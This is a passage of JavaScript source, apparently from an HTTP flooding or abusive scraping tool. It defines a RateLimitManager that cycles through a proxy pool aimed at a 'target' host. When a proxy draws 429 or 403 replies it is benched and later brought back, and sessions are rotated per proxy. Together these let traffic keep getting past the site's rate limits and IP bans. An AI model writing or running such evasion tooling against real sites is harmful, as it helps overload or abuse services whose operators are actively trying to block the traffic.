            return baseDelay * 1.5;
        }
        return baseDelay;
    }
}

class RateLimitManager {
    constructor() {
        this.sessions = new Map();
        this.proxyStatus = new Map();
        this.activeProxies = new Set(proxies);
        this.proxyRotationQueue = [];
        this.lastProxyRotation = new Map();
        this.targetHost = url.parse(target).host;
        this.pathTimings = new Map();
    }

    selectProxy() {
        const now = Date.now();
        const availableProxies = Array.from(this.activeProxies).filter(p => {
            const status = this.proxyStatus.get(p);
            const lastRotation = this.lastProxyRotation.get(p) || 0;
            return (!status || 
                    (status.bannedUntil < now && 
                     status.success >= status.fail &&
                     now - lastRotation >= PROXY_COOLDOWN));
        });

        if (availableProxies.length === 0) {
            const oldestRotation = Math.min(...Array.from(this.lastProxyRotation.values()));
            if (now - oldestRotation >= PROXY_COOLDOWN) {
                this.lastProxyRotation.clear();
                return this.selectProxy();
            }
            return null;
        }

        availableProxies.sort((a, b) => {
            const statusA = this.proxyStatus.get(a) || { success: 0, fail: 0, lastUsed: 0 };
            const statusB = this.proxyStatus.get(b) || { success: 0, fail: 0, lastUsed: 0 };
            const timeA = now - statusA.lastUsed;
            const timeB = now - statusB.lastUsed;
            const successRateA = statusA.success / (statusA.success + statusA.fail || 1);
            const successRateB = statusB.success / (statusB.success + statusB.fail || 1);
            return (successRateB - successRateA) || (timeA - timeB);
        });

        const selected = availableProxies[0];
        this.lastProxyRotation.set(selected, now);
        return selected;
    }

    updateProxyStatus(proxy, success, statusCode) {
        if (!this.proxyStatus.has(proxy)) {
            this.proxyStatus.set(proxy, {
                success: 0,
                fail: 0,
                lastUsed: 0,
                bannedUntil: 0,
                rateLimitCount: 0
            });
        }

        const status = this.proxyStatus.get(proxy);
        status.lastUsed = Date.now();

        if (success) {
            status.success++;
            status.fail = Math.max(0, status.fail - 1);
            status.bannedUntil = 0;
            if (status.rateLimitCount > 0) status.rateLimitCount--;
        } else {
            status.fail++;
            if (statusCode === 429) {
                status.rateLimitCount++;
            }

            if (status.rateLimitCount >= RATE_LIMIT_THRESHOLD || 
                status.fail >= 5 || 
                statusCode === 403) {
                const banDuration = statusCode === 403 ? 120000 : 60000;
                status.bannedUntil = Date.now() + banDuration;
                this.activeProxies.delete(proxy);
                setTimeout(() => {
                    status.rateLimitCount = 0;
                    this.activeProxies.add(proxy);
                }, banDuration);
            }
        }
    }

    getSession(proxy) {
        if (!this.sessions.has(proxy) || this.sessions.get(proxy).shouldRotateSession()) {
            this.sessions.set(proxy, new Session(proxy));
        }
        return this.sessions.get(proxy);
    }
}
